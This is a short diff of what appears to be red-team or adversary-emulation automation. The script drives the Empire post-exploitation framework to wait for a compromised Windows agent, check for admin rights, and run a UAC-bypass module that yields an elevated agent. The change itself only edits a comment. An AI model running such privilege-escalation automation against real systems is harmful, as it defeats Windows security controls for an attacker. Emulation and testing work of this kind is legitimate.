@@ -13,13 +13,12 @@ from stage3.escalate_privilege.windows import empire_bypassUAC
 try:
     # use a common API context instead of creating a new one per technique
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
-
     # we assume there's a non-privilege agent, some stager was executed before
     agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', False, 5)
     admin_type = empire_is_user_admin.run(API, agent['name']) 
     if admin_type is None:
         raise ValueError('BypassUAC can only be used with admin user')
-    
+    # else we could do more things to try to EoP    
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
     # wait for non-privilege agent
     agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True)
